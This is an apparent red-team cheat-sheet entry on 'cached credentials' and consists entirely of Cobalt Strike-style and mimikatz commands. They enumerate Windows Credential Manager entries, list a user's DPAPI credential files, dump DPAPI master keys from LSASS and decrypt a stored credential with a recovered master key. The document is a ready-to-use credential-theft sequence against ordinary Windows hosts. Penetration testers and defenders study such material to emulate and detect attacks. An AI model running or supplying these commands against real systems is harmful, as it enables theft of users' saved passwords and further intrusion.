## cached credentials 

```
shell vaultcmd /listcreds:"Windows Credentials" /all
powerpick Get-ChildItem C:\Users\rasta_mouse\AppData\Local\Microsoft\Credentials\ -Force

mimikatz dpapi::cred /in:C:\Users\rasta_mouse\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0
mimikatz !sekurlsa::dpapi

mimikatz dpapi::cred /in:C:\Users\rasta_mouse\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b
```
